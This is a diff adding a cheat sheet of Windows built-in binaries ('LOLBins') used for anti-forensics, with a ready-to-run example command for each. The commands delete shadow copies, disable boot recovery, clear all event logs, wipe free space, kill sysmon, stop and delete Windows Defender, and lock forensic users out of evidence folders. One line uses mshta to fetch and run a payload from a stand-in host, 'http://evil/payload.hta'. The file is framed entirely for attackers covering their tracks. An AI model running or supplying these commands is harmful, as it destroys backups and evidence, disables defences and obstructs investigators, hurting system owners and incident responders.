@@ -1,0 +1,81 @@
+LOLBins for Anti-Forensics (Windows)
+
+vssadmin.exe:
+  Purpose: Delete shadow copies (Volume Shadow Snapshots)
+  Example: vssadmin delete shadows /all /quiet
+
+bcdedit.exe:
+  Purpose: Tamper with bootloader, disable recovery
+  Example: bcdedit /set {default} recoveryenabled no
+
+cipher.exe:
+  Purpose: Secure free space wiping
+  Example: cipher /w:C:\
+
+wevtutil.exe:
+  Purpose: Clear event logs
+  Example: wevtutil cl System
+
+fsutil.exe:
+  Purpose: Disable last access timestamp
+  Example: fsutil behavior set disablelastaccess 1
+
+schtasks.exe:
+  Purpose: Schedule time-delayed cleanups
+  Example: schtasks /create /tn CleanLogs /tr "wevtutil cl *" /sc once /st 00:01
+
+reg.exe:
+  Purpose: Modify/delete registry entries
+  Example: reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MaliciousEntry /f
+
+attrib.exe:
+  Purpose: Hide files/directories
+  Example: attrib +h +s malware.exe
+
+powershell.exe:
+  Purpose: In-memory or fileless script execution
+  Example: powershell -nop -w hidden -c "Clear-EventLog -LogName *"
+
+rundll32.exe:
+  Purpose: In-memory DLL execution
+  Example: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";
+
+cmd.exe:
+  Purpose: Chain and script actions
+  Example: cmd /c del /f /q C:\*.log
+
+forfiles.exe:
+  Purpose: Wipe old logs or scheduled cleanups
+  Example: forfiles /p "C:\logs" /s /m *.* /d -7 /c "cmd /c del @path"
+
+taskkill.exe:
+  Purpose: Kill monitoring or logging services
+  Example: taskkill /f /im sysmon.exe
+
+netsh.exe:
+  Purpose: Disable or reconfigure firewalls/logging
+  Example: netsh advfirewall set allprofiles logging droppedconnections disable
+
+net.exe:
+  Purpose: Create/remove users
+  Example: net user attacker /delete
+
+sc.exe:
+  Purpose: Stop/delete security or forensic services
+  Example: sc stop WinDefend && sc delete WinDefend
+
+icacls.exe:
+  Purpose: Modify file/folder permissions
+  Example: icacls C:\Evidence /deny forensicuser:(OI)(CI)F
+
+wscript.exe:
+  Purpose: Fileless JS/VBS execution
+  Example: wscript.exe cleanup.vbs
+
+mshta.exe:
+  Purpose: In-memory HTML/JS payload execution
+  Example: mshta http://evil/payload.hta
+
+diskshadow.exe:
+  Purpose: Scripted VSS deletion or tampering
+  Example: diskshadow /s cleanup.dsh
